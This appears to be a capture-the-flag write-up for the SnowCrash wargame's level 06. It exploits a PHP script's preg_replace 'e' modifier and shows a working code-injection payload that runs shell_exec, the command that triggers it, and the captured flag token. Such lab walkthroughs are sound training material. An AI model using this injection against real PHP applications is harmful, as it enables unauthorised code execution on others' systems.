# Level 06

## Analysis

In the user's home directory, we found a PHP script that accepts two arguments. The first argument specifies the path of a file to be read, and its contents are subjected to a regex operation using the `preg_replace` function. We discovered that this function could be exploited, particularly with the 'e' flag, which allows for the execution of arbitrary code.

We created a file containing a string that matches the regex and also executes the `getflag` command:

```bash
echo '[x {${shell_exec(getflag)}}]' > /tmp/input
```

Executing the script with this input:

```bash
level06@SnowCrash:~$ ./level06 /tmp/input
```

Resulted in the following output, which includes the flag:

```
PHP Notice:  Use of undefined constant getflag - assumed 'getflag' in /home/user/level06/level06.php(4) : regexp code on line 1
PHP Notice:  Undefined variable: Check flag.Here is your token : wiok45aaoguiboiki2tuin6ub
```

## Documentation

- Discussion on exploiting `preg_replace` function: [Understanding preg_replace filtering exploitation](https://security.stackexchange.com/questions/151142/understanding-preg_replace-filtering-exploitation).
- Techniques to identify and execute PHP code within a string: [Identify and execute PHP code on a string](https://stackoverflow.com/questions/6103175/identify-and-execute-php-code-on-a-string).